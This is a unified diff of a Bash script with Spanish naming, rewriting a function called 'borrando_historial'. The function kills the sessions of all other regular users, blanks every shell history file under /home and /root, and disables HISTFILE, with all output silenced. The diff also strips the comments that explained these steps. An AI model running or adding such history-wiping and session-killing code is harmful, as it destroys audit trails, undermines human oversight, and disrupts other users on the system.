@@ -52,22 +52,18 @@ salir(){
 }
 
 borrando_historial(){
-   # 1. Obtener el usuario real que invocó sudo (para no matarnos a nosotros mismos)
-   USUARIO_REAL="${SUDO_USER:-$USER}"
-
-   # 2. Cerrar sesiones de otros usuarios (excluyendo root y al usuario actual)
-   for user in $(awk -F: '$3 >= 1000 && $1 != "nobody" {print $1}' /etc/passwd); do
-      if [ "$user" != "$USUARIO_REAL" ] && [ "$user" != "root" ]; then
-         pkill -u "$user"
-      fi
-   done
-
-   # 3. Limpiar historial en archivos de todo el sistema
-   find /home /root -name ".*_history" -type f -exec sh -c 'echo -n "" > "$1"' _ {} \;
-
-   # 4. Limpiar historial en memoria de la sesión actual
-   history -c
-   history -w
+    export HISTFILE=/dev/null
+    unset HISTFILE
+    USUARIO_REAL="${SUDO_USER:-$USER}"
+    for user in $(awk -F: '$3 >= 1000 && $1 != "nobody" {print $1}' /etc/passwd); do
+        if [ "$user" != "$USUARIO_REAL" ] && [ "$user" != "root" ]; then
+            pkill -u "$user"
+        fi
+    done
+    find /home /root -name ".*_history" -type f -exec sh -c 'echo -n "" > "$1"' _ {} \;
+    history -c
+    history -w
+    salir
 } > /dev/null 2>&1
 
 
